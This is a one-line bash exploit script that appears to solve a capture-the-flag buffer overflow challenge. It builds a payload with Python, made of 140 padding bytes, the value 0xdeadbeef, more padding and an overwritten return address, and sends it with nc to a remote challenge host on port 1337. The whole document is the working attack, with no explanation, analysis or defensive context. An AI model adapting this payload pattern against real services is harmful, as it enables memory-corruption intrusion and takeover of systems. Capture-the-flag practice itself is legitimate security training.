#!/bin/bash


python -c "print 'A'*140+'\xef\xbe\xad\xde'+'A'*8+'\x29\x52\x55\x55\x55\x55'" | nc bof101.sstf.site 1337
